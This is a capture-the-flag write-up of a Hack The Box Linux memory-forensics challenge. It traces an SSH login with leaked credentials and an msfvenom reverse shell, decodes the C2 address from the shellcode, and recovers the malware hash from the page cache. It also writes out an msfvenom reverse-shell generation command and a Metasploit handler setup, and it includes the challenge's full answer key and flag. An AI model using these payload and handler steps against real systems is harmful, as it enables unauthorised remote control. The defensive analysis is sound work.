---
title: "HTB SecFest'26 — Leaked: Linux Memory → MSFvenom Reverse Shell → Page-Cache MD5 Recovery"
platform: Hack The Box
event: "SecFest'26 Capture the Flag"
challenge: Leaked
app: Ubuntu 18.04 server (kernel 4.15.0-184-generic) — LiME memory capture; malware /home/developer/jN8ziHXGE
category: forensics
difficulty: hard
points: 925
type: writeup
status: complete
instance: 154.57.164.65:34763 — raw-TCP (nc) question grader, 6 questions — plus offline memory.dmp
mitre:
  - T1078
  - T1133
  - T1059.004
  - T1105
  - T1095
tags:
  - writeup
  - HTB
  - Security
  - DFIR
  - Incident_Response
  - Memory_Forensics
  - Linux
  - volatility
  - credential-access
related:
  - "[[HTB-SecFest26-Stolen-Variables-Frontend-Embedded-IAM-Key-CloudTrail-Enumeration-DynamoDB-Scan]]"
aliases:
  - Leaked
  - SecFest26 Leaked
created: 2026-10-29T01:08:37.796Z
updated: 2026-10-29T01:15:49.413Z
---

# Leaked — Linux Memory → MSFvenom Reverse Shell → Page-Cache MD5 Recovery

> [!success] Solved — 2026-10-28 21:07 (platform timestamp)
> **Scenario Pwned 6/6.** Flag: `HTB{wh0_l34k3d_th3_cr3ds!!!!?}`
> Graded by a raw-TCP question service (`nc 154.57.164.65 34763`), not an `HTB{}` string in the image. One wrong submission (Q4, the execution-second — see §5).

> [!info] Scenario, verbatim
> Our security team has been notified that the credentials of our Linux server have been found in a public data breach forum. After a quick investigation, it is clear that the server has been compromised. Luckily we managed to take a snapshot of the system's memory before shutting it down and isolating it. Try to analyze it and spot the malware. To get the flag, answer the questions from the docker instance successfully.

## 0. How the answers were obtained

1. Unzipped the challenge → `memory.dmp` (1.05 GiB, `ELF 64-bit LSB core file`, i.e. a LiME raw-ELF capture) and `Ubuntu_4.15.0-184-generic_profile.zip` (a **Volatility 2** Linux profile: `module.dwarf` + `System.map-4.15.0-184-generic`).
2. Confirmed the kernel without symbols: `vol -f memory.dmp banners.Banners` → `Linux version 4.15.0-184-generic … #194-Ubuntu SMP Thu Jun 2 18:54:48 UTC 2022`.
3. **Tooling pivot (§2):** the container had Volatility 3 but no Vol2, and the shipped profile is Vol2-only and in a form `dwarf2json` can't read. Built the Vol3 run off an **exact-match prebuilt ISF** for `4.15.0-184.194` from the Abyss-W4tcher symbol repo; validated with `linux.pslist`.
4. `linux.bash` → the attacker's shell history ends with `./jN8ziHXGE` at 15:22:03 — a random-named binary in the CWD. The malware.
5. `linux.pslist` / `linux.pstree` / `linux.psaux` → `jN8ziHXGE` is **PID 1521**, parent `bash` (1440) ← `sshd: developer@pts/0` (1439) ← `sshd` (1161). SSH session, user `developer`.
6. `linux.sockstat` → PID 1521 holds **ESTABLISHED** `192.168.1.5:39112 → 77.74.198.52:4444`. Reverse shell to a C2 on 4444.
7. `linux.elfs --pid 1521` → on-disk path `/home/developer/jN8ziHXGE`. `linux.ip.Addr` → `enp0s3 = 192.168.1.5`.
8. **MD5 trap (§4):** `linux.elfs --pid 1521 --dump` returned an all-zero page (the ELF page was not resident). Recovered the real 250-byte file from the **page cache** by inode (`linux.pagecache.InodePages`) → authoritative md5.
9. Rootkit sweep (`check_modules`, `hidden_modules`, `check_syscall`, `tty_check`) all clean — pure userland reverse shell. `malfind` hits are Python RWX false positives (§6).
10. Answered the six Docker questions (§5).

## 1. Shape of the challenge

Classic Linux DFIR: one memory image, "spot the malware," answer a grader's questions. The forensic content is moderate — a single msfvenom reverse shell dropped over an SSH session with leaked credentials. **The difficulty lives in two places, neither of them the malware itself:** standing up a working Volatility against a Vol2-only profile with no Vol2 present (§2), and recovering the real binary's md5 when the obvious dump is a decoy (§4).

Hosts and identities:

| Role | Value |
|---|---|
| Victim | `192.168.1.5` (`enp0s3`, MAC `08:00:27:3f:7a:8c` — VirtualBox) |
| Attacker (SSH source) | `192.168.1.30` |
| Compromised account | `developer` (uid 1000) |
| C2 | `77.74.198.52:4444` |
| Acquisition tool | LiME (dir `/home/developer/LiME` present in page cache) |

## 2. Tooling — building a Vol3 ISF when the room ships a Vol2 profile

The container had **Volatility 3 (2.28.2)** and Go, but **no Volatility 2 and no Python 2**. The provided profile is the wrong shape for both the modern tool and the obvious conversion:

- `module.dwarf` is **ASCII text** (a `dwarfdump` dump), not an ELF with `.debug_info`. `dwarf2json` parses binary DWARF out of an ELF, so it **cannot** consume this file. The "build the ISF from the provided profile" route is a dead end.
- The authoritative alternative — Ubuntu's `linux-image-4.15.0-184-generic-dbgsym` `.ddeb` (a `vmlinux` with DWARF, perfect for `dwarf2json`) — lives on `ddebs.ubuntu.com`, which the egress proxy does not allow (`curl` → `000`).

What worked: a **prebuilt ISF for the exact build** from [`Abyss-W4tcher/volatility3-symbols`](https://github.com/Abyss-W4tcher/volatility3-symbols), fetched without a full clone.

```bash
# GitHub git reads are proxied; api.github.com is gated, so use git, not the API.
GIT_LFS_SKIP_SMUDGE=1 git clone --depth 1 --filter=blob:none --no-checkout \
  https://github.com/Abyss-W4tcher/volatility3-symbols symrepo
git -C symrepo ls-tree -r --name-only HEAD | grep 4.15.0-184
#   Ubuntu/amd64/4.15.0/184/generic/Ubuntu_4.15.0-184-generic_4.15.0-184.194_amd64.json.xz
git -C symrepo show HEAD:.gitattributes        # empty → not Git-LFS, so the blob is real
mkdir -p symbols/linux
git -C symrepo show HEAD:Ubuntu/amd64/4.15.0/184/generic/Ubuntu_4.15.0-184-generic_4.15.0-184.194_amd64.json.xz \
  > symbols/linux/Ubuntu_4.15.0-184-generic_4.15.0-184.194_amd64.json.xz
```

The blobless no-checkout clone pulls only trees (fast, tiny); `git show` then fetches the **one** blob on demand. The ISF decompresses to 131,240 symbols / 9,002 types sourced from `vmlinux-4.15.0-184-generic`. Because Ubuntu kernels are deterministic builds, the `.194` ISF matches this `#194` image byte-for-byte — **but validate anyway** before trusting any answer:

```bash
vol -q -s symbols -f memory.dmp linux.pslist   # clean PID/PPID tree, real COMMs, Dec-2022 timestamps → good
```

## 3. The intrusion, reconstructed

```
15:20:56  sshd (1161, root)            pre-auth child accepts the connection
15:21:07  sshd (1439, developer@pts/0) post-auth session  ← login instant
15:21:07  bash (1440, developer)       interactive shell
15:21:49  /home/developer/jN8ziHXGE written to disk (250 bytes, mode 0744)
15:22:02.942  jN8ziHXGE (1521) fork/exec   ← pslist creation time
15:22:03      `./jN8ziHXGE` recorded in bash history
15:22:03  192.168.1.5:39112 → 77.74.198.52:4444  ESTABLISHED
~15:22   LiME capture taken
```

Bash history (`linux.bash`) is short and tells the whole story: `history`, `ip a`, `pwd`, `exit`, `sudo poweroff` ×2, `ls`, `pwd`, `ls`, `./jN8ziHXGE`. No `wget`/`curl` — the binary arrived another way (scp/sftp over the same SSH session is the likely delivery; not directly evidenced — §7).

The payload is a **staged msfvenom `linux/x64` reverse-TCP** stub. Its 250 bytes disassemble to: build `sockaddr_in` → `socket()` → `connect()` → `mmap()` an RWX region → `read()` the second stage from the socket → `jmp rsi` into it. The sockaddr is hardcoded at file offset 174:

```
offset 174:  02 00 | 11 5c | 4d 4a c6 34
             AF_INET  :4444   77.74.198.52
```

That `11 5c = 4444` and `4d 4a c6 34 = 77.74.198.52` independently corroborate the `sockstat` connection — the C2 is baked into the binary, not just observed live.

## 3a. Weaponization — how the payload was built with msfvenom

The recovered 250-byte stub is a textbook **msfvenom `linux/x64` staged reverse-TCP** payload. Reconstructed from the binary's structure and embedded configuration, the generation command was:

```bash
msfvenom -p linux/x64/shell/reverse_tcp LHOST=77.74.198.52 LPORT=4444 -f elf -o jN8ziHXGE
```

Every part is readable off the artifact:

| Component | Value | How the binary proves it |
|---|---|---|
| `-p linux/x64/shell/reverse_tcp` | staged reverse shell, x86-64 | stub runs `socket → connect → mmap(RWX) → read → jmp rsi` (it pulls a second stage), and carries **no** `/bin/sh` string, which a stageless payload would embed |
| `LHOST=77.74.198.52` | callback host | sockaddr bytes `4d 4a c6 34` |
| `LPORT=4444` | callback port | sockaddr bytes `11 5c` (0x115c = 4444) |
| `-f elf` | output format | 250-byte static ELF, no section headers — msfvenom's minimal ELF template |
| *(no `-e` encoder)* | raw shellcode | no NOP sled, no decoder stub; msfvenom does not encode unless asked |

**Staged, so the family is ambiguous by design.** `linux/x64/shell/reverse_tcp` and `linux/x64/meterpreter/reverse_tcp` ship the **identical** stage-1 stub — they differ only in the second stage delivered over the socket, which was never resident in this capture (§12). From the binary alone the two cannot be separated; `shell` is the simpler assumption.

The attacker's side was an MSF handler catching the callback:

```
msfconsole -q
use exploit/multi/handler
set payload linux/x64/shell/reverse_tcp
set LHOST 0.0.0.0        # listen on the C2 host (77.74.198.52)
set LPORT 4444
run
```

The file landed as mode `0744` (`-rwxr--r--`), so the executable bit was set — by the delivery or an unlogged `chmod +x` — and `./jN8ziHXGE` (bash history, 15:22:03) fired it.

> [!note] Reconstruction, not recovery
> The exact `msfvenom` line is inferred from the payload's shape and embedded `LHOST`/`LPORT`; it is not stored in the image. What is certain: x86-64 Linux, staged reverse-TCP, callback `77.74.198.52:4444`, ELF output, unencoded.

## 4. The MD5 trap — zero page vs. page cache

The instinct is `linux.elfs --pid 1521 --dump`. It "succeeds" and yields a 4096-byte file — **of all zeros**:

```
md5(elfs dump) = 620f0b67a91f7f74151bc5be745b7110   # == md5 of 4096 null bytes
```

The ELF's single page (`0x400000–0x401000`) was not resident at capture, so the dump is a page-sized hole. `620f0b67…` is the md5 of 4 KiB of zeros — a value that looks like an answer and is pure artifact. Submitting it fails the room.

The binary was **executed**, so its on-disk inode is in the page cache. Recover it there:

```bash
vol -q -s symbols -f memory.dmp linux.pagecache.Files | grep jN8ziHXGE
#   … 0x96f73c532328 … REG … /home/developer/jN8ziHXGE … 250
vol -q -s symbols -o out -f memory.dmp linux.pagecache.InodePages --inode 0x96f73c532328 --dump
#   DumpSafe=True → out/inode_0x96f73c532328.dmp  (250 bytes)
file out/inode_0x96f73c532328.dmp
#   ELF 64-bit LSB executable, x86-64, statically linked, no section header
```

That 250-byte file is the real malware:

| Hash | Value |
|---|---|
| md5 | `853bcc7d0867474ce3ab28ecb9756276` |
| sha1 | `d616f1c7a9e9a4f2208b84b57aaf40990ede83f0` |
| sha256 | `a8a037792b3f1d2a9bd0dba47be618631d4c015ec2fd488bc88cca5f326bfc23` |

> [!important] Transferable rule
> A `--dump` that returns a page-sized, round-number file of zeros (or whose md5 is a known empty-block constant) is a non-resident mapping, not the artifact. For an **executed** file, recover the inode from the page cache (`linux.pagecache.InodePages`) — that is the on-disk content, and its hash is the one a grader computed from the file.

## 5. The six Docker questions

Grader: `nc 154.57.164.65 34763` (raw TCP; re-asks on a wrong answer with no penalty).

| # | Question | Answer | Source |
|---|---|---|---|
| 1 | Username, date, time of login (UTC, `user YYYY-MM-DD HH:MM`) | `developer 2022-12-08 15:21` | `pslist` sshd(1439)/bash(1440) @ 15:21:07 |
| 2 | IP of the `enp0s3` interface | `192.168.1.5` | `linux.ip.Addr` |
| 3 | ID of the suspicious process | `1521` | `pslist` / `bash` |
| 4 | Time the malware was executed (UTC, `HH:MM:SS`) | `15:22:03` | **bash-history second** |
| 5 | IP:PORT the malware connected to | `77.74.198.52:4444` | `sockstat` + shellcode bytes |
| 6 | md5sum of the malware | `853bcc7d0867474ce3ab28ecb9756276` | page-cache inode recovery |

> [!warning] Q4 — the execution-second
> `15:22:02` (the `pslist` process-creation second, `15:22:02.942`) was **rejected**; `15:22:03` (the `linux.bash` whole-second, and the rounded-up value) was accepted. For "when was it executed" at second precision, the sub-second `fork/exec` rounds up and bash logs the whole second — **try the bash-history value first.** Burned one submission here (no penalty on this grader).

## 6. Rootkit sweep — clean (negative findings kept on record)

| Plugin | Result |
|---|---|
| `linux.check_modules` | 0 rows — no LKM-list discrepancy |
| `linux.hidden_modules` | 0 rows |
| `linux.check_syscall` | 734 entries, all legitimate `SyS_*` handlers — table not hooked |
| `linux.tty_check` | `tty1/2/6 → n_tty_receive_buf` — normal, no tty hook |
| `linux.malfind` | hits on **PID 862 (`networkd-dispatcher`)** and **966 (`unattended-upgrade`)** only |

The two `malfind` hits are `/usr/bin/python3` processes showing CPython's RWX trampoline pages (`mov r11,imm64; mov r10,imm64; jmp r11`) — a well-known false positive, **not** the malware. PID 1521's staged region did not surface in `malfind` (stage-2 not resident). No kernel-level component; the compromise is entirely the userland reverse shell.

## 7. Final payload — reproduction

```bash
# --- symbols (see §2) ---
S="-s symbols"; F="-f memory.dmp"; B="vol -q $S $F"

$B banners.Banners                         # confirm 4.15.0-184-generic #194
$B linux.bash                              # ./jN8ziHXGE @ 15:22:03  (the lead)
$B linux.pslist | awk '$2==1439||$2==1440||$2==1521'   # login + exec times
$B linux.pstree                            # bash(1440) → jN8ziHXGE(1521)
$B linux.sockstat | grep -i jN8            # ESTABLISHED → 77.74.198.52:4444
$B linux.elfs --pid 1521                   # path /home/developer/jN8ziHXGE
$B linux.ip.Addr                           # enp0s3 = 192.168.1.5

# --- real binary (NOT linux.elfs --dump, which is a zero page) ---
$B linux.pagecache.Files | grep jN8ziHXGE  # inode 0x96f73c532328, size 250
vol $S -o out $F linux.pagecache.InodePages --inode 0x96f73c532328 --dump
md5sum out/inode_0x96f73c532328.dmp        # 853bcc7d0867474ce3ab28ecb9756276

# --- confirm C2 is in the shellcode ---
od -A d -t x1 out/inode_0x96f73c532328.dmp | grep '11 5c 4d 4a c6 34'   # :4444 77.74.198.52
```

## 8. Tools & techniques
Volatility 3 2.28.2 · `banners`, `linux.pslist/pstree/psaux/bash/sockstat/elfs/ip.Addr/lsof/proc_maps` · `linux.pagecache.Files` + `linux.pagecache.InodePages` (page-cache file recovery) · `linux.malfind/check_modules/hidden_modules/check_syscall/tty_check` · blobless partial `git clone` for a single symbol file · `od`/`file`/`md5sum` · msfvenom shellcode sockaddr decode
Concepts: building a Vol3 ISF from a prebuilt community symbol pack when the room ships a Vol2 profile · page-cache inode recovery of an executed binary · distinguishing a non-resident zero-page dump from the real artifact · msfvenom staged reverse-TCP stub identification · reading the C2 sockaddr out of raw shellcode · Python RWX `malfind` false positives

## 9. MITRE ATT&CK
- **T1078** Valid Accounts — leaked `developer` credentials reused for access (the scenario's premise)
- **T1133** External Remote Services — inbound SSH from `192.168.1.30`
- **T1059.004** Command and Scripting Interpreter: Unix Shell — `bash` session running `./jN8ziHXGE`
- **T1105** Ingress Tool Transfer — the reverse-shell binary placed on the host; the stager pulls a second stage over the C2 socket
- **T1095** Non-Application Layer Protocol — raw-TCP reverse shell to `77.74.198.52:4444`

> [!note] Honest scope
> The image is a single post-compromise snapshot. **T1078/T1133** are inferred from the scenario text plus the `developer` SSH session from `192.168.1.30`; there is no captured auth log in the evidence. The binary's delivery method (scp/sftp vs other) is not directly evidenced — bash history shows no download. `T1095` could instead be written as **T1571** Non-Standard Port (4444); both describe the same observation. No persistence technique is claimed — none was set up (no cron/systemd/bashrc changes).

## 9a. Lockheed Martin Cyber Kill Chain

The ATT&CK list above (§9) names the techniques; the kill chain tells the phase-ordered story. This capture is a freeze-frame at **phase 6** — the reverse shell connected roughly a second before LiME ran, so the early phases are reconstructed and the last is unreached.

| # | Phase | In this intrusion | Basis |
|---|---|---|---|
| 1 | Reconnaissance | `developer`'s credentials harvested from a public data-breach forum | scenario premise — not in the image |
| 2 | Weaponization | msfvenom `linux/x64` staged reverse-TCP ELF, `LHOST 77.74.198.52` / `LPORT 4444` (§3a) | recovered binary + embedded sockaddr |
| 3 | Delivery | binary written to `/home/developer/jN8ziHXGE` over the authenticated SSH session (scp/sftp) | file created 15:21:49 mid-session; method inferred |
| 4 | Exploitation | **no software exploit** — valid-account SSH login, then the user running the dropped binary | `sshd: developer@pts/0`; `./jN8ziHXGE` in bash history |
| 5 | Installation | **none observed** — no persistence (cron, systemd, `.bashrc`, service); the shell ran only in memory | clean rootkit/persistence sweep (§6); 10-line bash history |
| 6 | Command & Control | reverse shell **ESTABLISHED** to `77.74.198.52:4444` | `sockstat` + hardcoded sockaddr |
| 7 | Actions on Objectives | **not reached in the evidence** — snapshot taken ~1 s after C2, before any post-exploitation | timeline: exec 15:22:03, capture ~15:22 |

> [!important] Where the chain was cheapest to break
> Two phases carry the defence. **Delivery / Exploitation** collapses if password SSH is disabled for service accounts — leaked credentials are inert against key-only auth, which is the entire premise of this room. **C2** collapses under an egress default-deny — the `connect()` to `:4444` never completes. And because **Installation is empty** (nothing persistent was planted), eviction is just killing PID 1521 and rotating the credential — but that same absence means the only window to catch this host red-handed was while the shell was live, which is exactly why capturing memory before shutdown mattered.

## 10. Detection / blue-team & fix notes
- **Leaked-credential SSH is the root cause.** The named defence is to kill password SSH for service accounts: keys or certificates only, MFA, and `AllowUsers`/bastion scoping. A credential in a breach dump is worthless against key-only auth.
- **Egress to `:4444` (and other common MSF ports) from a server has near-zero legitimate use.** An egress firewall that default-denies outbound from server subnets would have blocked the reverse shell at `connect()`; alert on any new outbound TCP from a host that normally only *accepts*.
- **A world-executable, random-named binary written to a home directory minutes before it runs** is a high-signal EDR/auditd event — `auditd` `execve` of a path under `/home/*` that is not a known interpreter, especially one created seconds earlier.
- **`sudo poweroff` in the attacker's history** is an anti-forensics attempt (destroy volatile evidence). The defenders doing a **LiME capture before shutdown** is exactly the right move and is why this was solvable — bank the memory image before powering a suspected-compromised host down.
- Hunt value: one `accessKeyId`-equivalent here is the binary hash `853bcc7d…` and the C2 `77.74.198.52` — pivot both across the fleet and threat-intel.

## 11. Method notes
- **Read the shipped profile's format before planning the toolchain.** `file module.dwarf` → "ASCII text" settled in one command that `dwarf2json` was out and a prebuilt ISF was the path — saving a doomed Vol2/Python-2 build attempt.
- **Probe egress before choosing a symbol source.** `curl -o /dev/null -w %{http_code}` across `api.github.com`, `raw.githubusercontent.com`, `ddebs.ubuntu.com` mapped the terrain up front: GitHub open, Ubuntu ddebs blocked. That ruled out the dbgsym route before it cost anything.
- **Validate symbols with `pslist` before trusting any answer.** An exact-version ISF still gets a sanity check: real COMMs, coherent PID tree, timestamps matching the capture date.
- **A `--dump` is not evidence until you look at the bytes.** The zero-page `elfs` dump would have failed Q6 silently; one `od`/`file` on it exposed it as nulls and sent me to the page cache.
- **Second-precision "when" questions are ambiguous by one second.** Carry both the `pslist` creation second and the `linux.bash` second; prefer the bash value for "executed" prompts.

## 12. Open items
- Delivery method of `/home/developer/jN8ziHXGE` is unconfirmed (no download in history; scp/sftp over the SSH session is the hypothesis).
- Stage 2 of the payload was never resident (the `mmap` RWX region was empty in the capture), so whether the handler was `linux/x64/shell/reverse_tcp` or `…/meterpreter/reverse_tcp` is not determined from the image alone — the stage-1 stubs are identical.
- The source host `192.168.1.30` and the external C2 `77.74.198.52` are recorded but not attributed.
- `linux.proc_maps --pid 1521` returned no rows (the process's VMA list did not parse); mappings were read via `linux.elfs` instead. Cause not chased.

## 13. Appendix — answer key, IOCs & timeline

### 13.1 Docker answer key (6/6)

| # | Question | Answer |
|---|---|---|
| 1 | Username, date, time of login (UTC) | `developer 2022-12-08 15:21` |
| 2 | IP of the `enp0s3` interface | `192.168.1.5` |
| 3 | ID of the suspicious process | `1521` |
| 4 | Time the malware was executed (UTC) | `15:22:03` *(not `15:22:02` — §5)* |
| 5 | IP:PORT the malware connected to | `77.74.198.52:4444` |
| 6 | md5sum of the malware | `853bcc7d0867474ce3ab28ecb9756276` |
| — | Flag | `HTB{wh0_l34k3d_th3_cr3ds!!!!?}` |

### 13.2 Full IOC reference

| Item | Value |
|---|---|
| Compromised user | `developer` (uid 1000) |
| Attacker SSH source IP | `192.168.1.30` |
| Victim IP (`enp0s3`) | `192.168.1.5` (MAC `08:00:27:3f:7a:8c`) |
| Malicious process | `jN8ziHXGE` |
| PID / PPID | `1521` / `1440` (bash) |
| Process lineage | `sshd` (964) → `sshd` (1161) → `sshd: developer@pts/0` (1439) → `bash` (1440) → `jN8ziHXGE` (1521) |
| Command run | `./jN8ziHXGE` |
| Full path | `/home/developer/jN8ziHXGE` |
| File size / mode | 250 bytes / `0744` (`-rwxr--r--`) |
| **md5** | `853bcc7d0867474ce3ab28ecb9756276` |
| sha1 | `d616f1c7a9e9a4f2208b84b57aaf40990ede83f0` |
| sha256 | `a8a037792b3f1d2a9bd0dba47be618631d4c015ec2fd488bc88cca5f326bfc23` |
| C2 IP : port | `77.74.198.52` : `4444` |
| Local source port | `39112` |
| Payload type | msfvenom `linux/x64` staged reverse-TCP (shell or meterpreter stage-1) |
| Acquisition tool | LiME (`/home/developer/LiME`) |
| Kernel | `4.15.0-184-generic #194` (amd64) |
| **Decoy** md5 (do not submit) | `620f0b67a91f7f74151bc5be745b7110` — hash of the 4 KiB zero page from `linux.elfs --dump`, **not** the malware |

### 13.3 Consolidated intrusion timeline (UTC, 2022-12-08)

| Time | Event | Evidence |
|---|---|---|
| 15:20:56 | `sshd` (1161, root) accepts the connection (pre-auth) | `pslist` |
| 15:21:07 | `developer` authenticated — `sshd` session (1439) + `bash` (1440) | `pslist` → **Q1 login** |
| 15:21:49 | `/home/developer/jN8ziHXGE` written to disk (250 B, `0744`) | `pagecache.Files` |
| 15:22:02.942 | `jN8ziHXGE` (1521) fork/exec | `pslist` creation time |
| 15:22:03 | `./jN8ziHXGE` recorded in bash history | `linux.bash` → **Q4 exec** |
| 15:22:03 | C2 established: `192.168.1.5:39112 → 77.74.198.52:4444` | `sockstat` |
| ~15:22 | LiME memory capture taken | dump metadata |

### 13.4 Negative findings (no kernel compromise)

`check_modules` 0 · `hidden_modules` 0 · `check_syscall` intact (`SyS_*`) · `tty_check` normal. `malfind` hits on PID 862 (`networkd-dispatcher`) and 966 (`unattended-upgrade`) are CPython RWX false positives, not the malware.

## Cross-references
- [[HTB-SecFest26-Stolen-Variables-Frontend-Embedded-IAM-Key-CloudTrail-Enumeration-DynamoDB-Scan]] — the other SecFest'26 forensics room; both are credential-leak-to-access stories graded by short answers

## Change Log
- 2026-10-29 — Added §3a (msfvenom weaponization reconstruction), §9a (Lockheed Martin Cyber Kill Chain mapping), and §13 (appendix: Docker answer key, full IOC reference, consolidated timeline, negative findings); corrected the §3 sockaddr offset to 174 (was 176); refreshed `updated`.
- 2026-10-29 — Note created. Full solve: the Vol2-profile-to-Vol3-ISF toolchain rebuild via the Abyss-W4tcher symbol repo, the intrusion timeline, msfvenom staged reverse-TCP identification with the C2 decoded from the shellcode, the zero-page-vs-page-cache md5 trap, the six Docker Q&A with the execution-second correction, the clean rootkit sweep with Python malfind false positives, detections, method notes, and open items.
